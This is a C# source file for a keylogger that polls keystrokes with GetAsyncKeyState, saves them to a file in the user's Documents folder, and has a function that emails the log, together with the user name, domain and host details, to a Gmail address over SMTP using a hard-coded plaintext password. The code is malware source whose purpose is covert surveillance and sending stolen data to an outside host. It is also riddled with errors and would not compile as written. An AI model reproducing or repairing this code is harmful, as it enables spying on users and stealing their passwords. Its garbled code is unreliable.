using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberofKeyStrokes = 0;
        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\keystrokes.txt");
            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) 
                {
                    sw.Write((char) i); 
                }
                numberofKeyStrokes++;
                if (numberofKeyStrokes % 100 == 0 )
                {
                    sendMessagenew();
                }
            }
            //capture keystrokes and print to console
            while (true)
            {
                // pause and let other programs get a chance to run 
                Thread.Sleep(5);
                for (int i=32; i <= 127; i++)
                {
                    int Keystate = GetAsyncKeyState(i);
                    if(Keystate == -32767)
                    {
                        Console.Write((char) i + ', ');
                        using (StreamWriter sw = File.CreateText(path)) 
                        {
                            sw.Write((char) i); 
                        }
                    }
                }
                // check all keys for their state

                // print to console 
            }
            //store keystrokes into textfile
            
            //periodically send logfile contents via mail
        }
        static void sendMessagenew() 
        {
            String foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String filepath = foldername+ @"\keystrokes.txt";
            String logContents = File.ReadAllText(filepath);
            String mailbody =  "";
            DateTime now = DateTime.Now;
            String subject = "Message from keylogger";
            var host = dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.Addresslist)
            {
                mailbody +="\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
                mailbody +="\nhost" + host;
                mailbody += "\ntime: " + now.ToString();
                mailbody += logContents;

                SetupClient client = new SetupClient(StringComparer.gmail.com, 587);
                MailMessage mailMessage = new MailMessage();

                mailMessage.From = new MailAddress("bemesandra@gmail.com");
                mailMessage.ToAdd("bemesandra@gmail.com");
                mailMessage.subject = subject;
                client.userDefaultCredentials = false;
                client.EnableSsl = true;
                client.Credentials = new System.Net.NetworkCredential("bemesandra@gmail.com", "ppgradin7700");
                mailMessage.Body = mailbody;

                client.send(mailMessage);


            }
        }
    }
}